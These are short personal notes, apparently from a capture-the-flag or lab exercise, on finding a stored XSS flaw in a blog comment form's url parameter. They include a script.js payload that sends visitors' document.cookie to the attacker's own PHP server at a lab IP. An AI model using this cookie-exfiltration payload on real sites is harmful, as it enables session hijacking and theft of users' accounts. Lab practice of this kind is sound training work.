# XSS Candidates:
comment form:
http://10.129.148.82/assessment/index.php/2021/06/11/welcome-to-security-blog/

search bar at:
http://10.129.148.82/assessment/

searchbar wasn't exploitable by chance

so i tested the form and found out several filters for name and email are in place.
i tested the url and comment parameters and got a hit to my php server
![](Pasted%20image%2020250612224939.png)

okay its the url parameter, ive confirmed

setup `script.js` file that sends users creds to our php server and call it within the affected parameter
```
$ cat script.js 
new Image().src='http://10.10.16.12:8000/index.php?c='+document.cookie
```
![](Pasted%20image%2020250612225618.png)
hit send

![](Pasted%20image%2020250612225600.png)
